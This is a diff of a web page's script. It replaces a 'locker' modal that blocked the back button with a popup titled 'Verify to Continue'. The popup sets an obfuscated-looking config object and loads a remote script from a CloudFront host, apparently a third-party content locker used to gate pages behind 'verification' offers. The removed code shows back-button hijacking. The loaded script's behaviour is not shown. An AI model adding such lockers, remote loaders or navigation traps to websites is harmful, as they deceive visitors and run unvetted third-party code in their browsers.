@@ -229,13 +229,42 @@
 
 <script>
   function openLocker() {
-    document.getElementById('lockerModal').style.display = 'flex';
-    history.pushState(null, null, window.location.href);
-    window.onpopstate = function () {
-      history.go(1);
-    };
+    const popup = window.open('', '_blank', 'width=500,height=600,top=100,left=100,noopener,noreferrer');
+
+    if (popup) {
+      popup.document.write(`
+        <html>
+          <head>
+            <title>Verify to Continue</title>
+            <style>
+              body {
+                margin: 0;
+                background-color: #000;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                color: white;
+                font-family: Arial, sans-serif;
+              }
+            </style>
+          </head>
+          <body>
+            <div id="locker-container"></div>
+            <script>
+              var deoEP_wII_oJNdsc = {"it":4482512,"key":"6975c"};
+            </script>
+            <script src="https://d2yc6hxtq0phup.cloudfront.net/4b522c7.js"></script>
+          </body>
+        </html>
+      `);
+      popup.document.close();
+    } else {
+      alert('يرجى تفعيل النوافذ المنبثقة (Popup) في المتصفح!');
+    }
   }
 </script>
+
 
 </body>
 </html>
